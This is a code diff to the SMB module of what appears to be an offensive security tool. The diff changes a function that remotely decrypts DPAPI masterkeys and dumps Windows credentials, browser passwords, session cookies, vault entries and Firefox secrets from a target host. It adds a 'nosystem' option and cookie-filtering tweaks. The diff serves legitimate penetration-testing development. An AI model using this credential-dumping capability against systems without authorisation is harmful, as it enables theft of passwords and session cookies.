@@ -1466,6 +1466,7 @@ class smb(connection):
 
     @requires_admin
     def dpapi(self):
+        dump_system = False if "nosystem" in self.args.dpapi else True
         logging.getLogger("dploot").disabled = True
 
         if self.args.pvk is not None:
@@ -1473,7 +1474,7 @@ class smb(connection):
                 self.pvkbytes = open(self.args.pvk, "rb").read()
                 self.logger.success(f"Loading domain backupkey from {self.args.pvk}")
             except Exception as e:
-                logging.error(str(e))
+                self.logger.fail(str(e))
 
         masterkeys = []
         if self.args.mkfile is not None:
@@ -1561,7 +1562,8 @@ class smb(connection):
             )
             self.logger.debug(f"Masterkeys Triage: {masterkeys_triage}")
             masterkeys += masterkeys_triage.triage_masterkeys()
-            masterkeys += masterkeys_triage.triage_system_masterkeys()
+            if dump_system:
+                masterkeys += masterkeys_triage.triage_system_masterkeys()
         except Exception as e:
             self.logger.debug(f"Could not get masterkeys: {e}")
 
@@ -1571,14 +1573,17 @@ class smb(connection):
 
         self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")
 
+        credentials = []
+        system_credentials = []
         try:
             # Collect User and Machine Credentials Manager secrets
             credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=masterkeys)
             self.logger.debug(f"Credentials Triage Object: {credentials_triage}")
             credentials = credentials_triage.triage_credentials()
             self.logger.debug(f"Triaged Credentials: {credentials}")
-            system_credentials = credentials_triage.triage_system_credentials()
-            self.logger.debug(f"Triaged System Credentials: {system_credentials}")
+            if dump_system:
+                system_credentials = credentials_triage.triage_system_credentials()
+                self.logger.debug(f"Triaged System Credentials: {system_credentials}")
         except Exception as e:
             self.logger.debug(f"Error while looting credentials: {e}")
 
@@ -1603,9 +1608,11 @@ class smb(connection):
                 credential.target,
             )
 
+        browser_credentials = []
+        cookies = []
         try:
             # Collect Chrome Based Browser stored secrets
-            dump_cookies = True if self.args.dpapi == "cookies" else False
+            dump_cookies = True if "cookies" in self.args.dpapi else False
             browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys)
             browser_credentials, cookies = browser_triage.triage_browsers(gather_cookies=dump_cookies)
         except Exception as e:
@@ -1625,9 +1632,11 @@ class smb(connection):
         if dump_cookies:
             self.logger.display("Start Dumping Cookies")
             for cookie in cookies:
-                self.logger.highlight(f"[{credential.winuser}][{cookie.browser.upper()}] {cookie.host}{cookie.path} - {cookie.cookie_name}:{cookie.cookie_value}")
+                if cookie.cookie_value != '':
+                    self.logger.highlight(f"[{credential.winuser}][{cookie.browser.upper()}] {cookie.host}{cookie.path} - {cookie.cookie_name}:{cookie.cookie_value}")
             self.logger.display("End Dumping Cookies")
 
+        vaults = []
         try:
             # Collect User Internet Explorer stored secrets
             vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys)
@@ -1647,6 +1656,7 @@ class smb(connection):
                     vault.resource,
                 )
 
+        firefox_credentials = []
         try:
             # Collect Firefox stored secrets
             firefox_triage = FirefoxTriage(target=target, logger=self.logger, conn=conn)
